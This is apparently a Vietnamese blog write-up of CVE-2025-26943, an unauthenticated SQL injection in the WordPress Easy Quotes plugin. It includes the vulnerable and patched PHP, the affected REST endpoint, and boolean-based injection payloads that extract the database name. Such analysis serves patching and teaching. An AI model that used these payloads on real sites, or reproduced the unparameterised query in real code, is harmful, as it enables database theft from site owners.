---
title: CVE-2025-26943 Analysis & POC
description: Security Vulnerability in WordPress Easy Quotes Plugin.
date: 2025-09-23 23:28:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, sqli]

images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Lỗ hổng xảy ra trên plugin **Easy Quotes** của WordPress trước phiên bản **1.2.3**. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.

* **CVE ID**: [CVE-2025-26943](https://www.cve.org/CVERecord?id=CVE-2025-26943)
* **Product**: [WordPress Easy Quotes Plugin](https://wordpress.org/plugins/easy-quotes/#description)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 1.2.2
* **CVSS severity**: High (9.3)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Taskbuilder Plugin**:  v1.2.2(vul) và v1.2.3(fix)
* **diff tool**: **meld** hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version

## Analysis

Ứng dụng đã đưa trực tiếp dữ liệu từ người dùng vào câu query SQL mà **không sử dụng các biện pháp bảo vệ** khiến lỗ hổng SQL Injection xảy ra.

### Patch Diff

Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file **includes/quotes-data.php**

```php
private static function get_family_data($family) {
    /** @var wpdb $wpdb */
    global $wpdb;
    $tablename = $wpdb->prefix . 'easy-quotes-families';
    return $wpdb->get_row("SELECT * FROM `".$tablename."` WHERE `family`='".$family."';");
}
```

Bản vá sử dụng `$wpdb->prepare()` thay vì truyền trực tiếp dữ liệu từ người dùng vào câu query.

```php
private static function get_family_data($family) {
    /** @var wpdb $wpdb */
    global $wpdb;
    $tablename = $wpdb->prefix . 'easy-quotes-families';
    $sql = $wpdb->prepare(
        "SELECT * FROM %i WHERE `family` = %s",
        $tablename, $family
    );
    return $wpdb->get_row($sql);
}
```

{{< figure src="patch_dif.png" caption="Patch diff" alt="Patch diff" >}}

Có nhiều hàm cũng được vá bằng cách trên, như: `get_font_variant($family_id, $variant_id)`, `get_font_variants($family)`, `get_fonts($category = -1)`

Tuy `get_fonts_categories()` đã được vá nhưng nó không chứa dữ liệu từ người dùng, nên không cần quan tâm

```php
public static function get_fonts_categories() {
    /** @var wpdb $wpdb */
    global $wpdb;
    $tablename = $wpdb->prefix . 'easy-quotes-categories';
    $sql = $wpdb->prepare(
        "SELECT `category_id`, `category` FROM %i",
        $tablename
    );
    return $wpdb->get_results($sql);
}
```

### How it work?

Ta khai thác lỗi SQL Injection trong hàm `get_family_data($family)`, các hàm còn lại khai thác tương tự.

`get_family_data()` là hàm public trong class `Quotes_Data`

```php
class Quotes_Data
{
	function __construct()
	{
		add_filter('posts_where', array($this, 'posts_where'), 10, 2);
	}

    // other function

	public static function get_font_variants($family) {
		$familyData = self::get_family_data($family);
        // other logic
	}

	public static function get_family($family, $variant_id) {
		$family_data = (array)self::get_family_data($family);
        // other logic
	}

	private static function get_family_data($family) {
		/** @var wpdb $wpdb */
		global $wpdb;
		$tablename = $wpdb->prefix . 'easy-quotes-families';
		return $wpdb->get_row("SELECT * FROM `".$tablename."` WHERE `family`='".$family."';");
	}
}
```

`get_family_data()` được gọi trong 2 hàm `get_family()` và `get_font_variants()` của class `Quotes_Data`, để biết chúng sử dụng ở đâu, ta tìm kiến với từ khóa `get_family` hoặc `get_font_variants`

{{< figure src="search_func.png" caption="Search function" alt="Search function" >}}

Hàm `get_font_variants()` được gọi trong hàm `rest_route_callback_font_variants()` của class `Quotes_Rest_Route`

```php
class Quotes_Rest_Route
{
    function __construct()
    {
        add_action('rest_api_init', array($this, 'rest_api_init'));
    }

    /**
     * Register my REST route
     *
     * @return void
     */
    function rest_api_init($wp_rest_server)
    {
        $args = [
        'method'                => WP_REST_Server::READABLE,
        'callback'              => [$this, 'rest_route_callback_quote'],
        'permission_callback'   => '__return_true'
        ];
        register_rest_route('layart/v1', '/quote', $args);

        // other logic

        $args['callback'] = [$this, 'rest_route_callback_font_variants'];
        register_rest_route('layart/v1', '/font-variants', $args);
    }

    // other function

    function rest_route_callback_font_variants(WP_REST_Request $request)
    {
        $family = $request->get_param('family');
        $family = isset($family) ? $family : "Shadows Into Light";

        $response = Quotes_Data::get_font_variants($family);
        return rest_ensure_response($response);
    }
}
```

Hàm khởi tạo của class `Quotes_Rest_Route` sử dụng `add_action(hook_name, callback)` với `hook_name` là `rest_api_init` để đăng ký các endpoint tùy chỉnh với REST API System của WordPress

Callback `rest_api_init` sử dụng `register_rest_route` nhiều lần để tạo các endpoint dưới namespace `layart/v1`

`rest_route_callback_font_variants` là callback của endpoint `/wp-json/layart/v1/font-variants?family=family_name`

`$family` mặc định là `Shadows Into Light` nếu không được truyền trong param.

## Exploit

### Detect SQLi

Ta thử kỹ thuật **Boolean-based SQL Injection** để kiểm tra xem tham số family có dễ bị chèn lệnh SQL hay không.

**True request**:
{{< figure src="true_req.png" caption="True request" alt="True request" >}}

Khi đó, câu query thực thi sẽ trở thành:

```sql
SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+'1'='1'"
```

Điều kiện `AND '1'='1'` luôn đúng => query hợp lệ, trả về dữ liệu bình thường.

**False request**:
{{< figure src="false_req.png" caption="False request" alt="False request" >}}

Khi đó, câu query thực thi sẽ trở thành:

```sql
SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+'1'='2'"
```

Điều kiện `AND '1'='2'` luôn sai => query không khớp => trả về `[]`.

### Get First Letter of Database Name

Điều kiện tiên quyết để **dump được hết data** là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.

> Database name được tôi đặt tên là **wordpress** nên kí tự đầu tiên là `w`

{{< figure src="first_letter.png" caption="First letter" alt="First letter" >}}

Response trả về dữ liệu bình thường => kí tự đầu tiên là `w`

Khi đó, câu query thực thi sẽ trở thành:

```sql
SELECT * FROM wp_easy-quotes-families WHERE family='Roboto'+AND+SUBSTRING(DATABASE(),1,1)='w'"
```

## Conclusion

Lỗ hổng **CVE-2025-26943** trong plugin WordPress **Easy Quotes** trước phiên bản **1.2.3** xuất phát từ việc không sử dụng cơ chế chuẩn bị truy vấn `($wpdb->prepare)` mà truyền trực tiếp dữ liệu từ người dùng vào câu lệnh SQL dẫn đến lỗ hổng SQL Injection.

Bản vá chính thức đã thay thế việc nối chuỗi bằng cách dùng `$wpdb->prepare`, giúp đảm bảo dữ liệu đầu vào được kiểm soát và an toàn hơn.

**Key takeaways**:

* Luôn sử dụng `$wpdb->prepare()` khi làm việc với database trong WordPress để tránh SQL Injection.
* Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Easy Quotes Plugin <= 1.2.2 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/easy-quotes/vulnerability/wordpress-easy-quotes-plugin-1-2-2-sql-injection-vulnerability)
